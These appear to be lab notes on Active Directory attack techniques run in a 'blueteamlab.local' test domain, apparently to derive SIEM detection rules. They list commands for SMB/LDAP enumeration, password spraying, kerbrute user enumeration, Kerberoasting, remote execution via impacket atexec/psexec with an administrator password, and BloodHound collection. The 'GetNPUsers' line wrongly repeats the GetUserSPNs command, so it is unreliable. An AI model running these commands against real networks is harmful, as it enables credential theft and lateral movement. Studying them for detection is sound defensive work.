Used diferent echniques to find new detection rules :
- enabled rules built-in in the siem 

About tools :
- kerbrute
- nxc
- bloodhound-python

nxc is an assment and exploitation tool.
First i ran an smb enumeration : 
- nxc smb 192.168.56.0/24, the dc is the one with the 'signing:True' flag 

also can be identify like this : 
-  nxc ldap 192.168.56.0/24 --dc-list

In case you already have a successful account 
- nxc smb 192.168.56.0/24 -u Juliette -p 'Password1' --users

Once i get all users of my domain i can export a list to run a password spraying or a bruteforce 
- nxc smb 192.168.56.102 -u Juliette -p 'Password1' --users-export account.txt

Now i can test password spraying or bruteforce 
- nxc smb 192.168.56.102 -u account.txt -p 'Password1' --no-bruteforce --continue-on-success


- nxc smb 192.168.56.102 -u account.txt -p password.txt --no-bruteforce --continue-on-success
for the passwords list i copy first lines of /usr/share/worlists/rockyou.txt and then add the password i already have to it

I used the kerbrute tool to made enumeration targetting kerberos as it doesn't triggered 4625 failed authentication 

Kerbrute exploits the fact that Kerberos returns different error codes for valid vs. invalid usernames before authentication occurs. When a valid username is submitted, the KDC responds with "KDC_ERR_PREAUTH_REQUIRED" (pre-authentication needed), while invalid usernames return "KDC_ERR_C_PRINCIPAL_UNKNOWN" (principal unknown). This distinction enables rapid user enumeration. 

- git clone https://github.com/ropnop/kerbrute.git 
- cd kerbrute
- go build
- ./kerbrute -h
- ./kerbrute userenum --dc 192.168.56.102 -d blueteamlab.local /usr/share/seclists/Usernames/top-usernames-shortlist.txt 

GetUserSPN de la suite impacket 
- impacket-GetUserSPNs blueteamlab.local/Juliette:Password1 -dc-ip 192.168.56.102 -request

GetNPUsers de la suite impacket 
- impacket-GetUserSPNs blueteamlab.local/Juliette:Password1 -dc-ip 192.168.56.102 -request

ATExec tool to execute a command remotely
- impacket-atexec blueteamlab.local/Administrateur:#@4458654##Tete@192.168.56.30 "tasklist"
- impacket-atexec blueteamlab.local/Administrateur:#@4458654##Tete@192.168.56.30 "ipconfig"
- impacket-atexec blueteamlab.local/Administrateur:#@4458654##Tete@192.168.56.30 "whoami"

PSExec tool 
- impacket-psexec blueteamlab.local/Administrateur:#@4458654##Tete@192.168.56.30 "whoami"
- impacket-psexec blueteamlab.local/Administrateur:#@4458654##Tete@192.168.56.30 "ipconfig"

BloodHound
- bloodhound-python -u 'Juliette' -p 'Password1' -d blueteamlab.local -dc dc1.blueteamlab.local -ns 192.168.56.102 -c All 
    All will get get complete data (sessions, local real admins) but too noisy can be detected to easily 

-  bloodhound-python -u 'Juliette' -p 'Password1' -d blueteamlab.local -dc dc1.blueteamlab.local -ns 192.168.56.102 -c DConly 
    Complete ACL, group, and trust data, but no active session data or actual local administrator group membership (this information is either inferred differently or unavailable).
    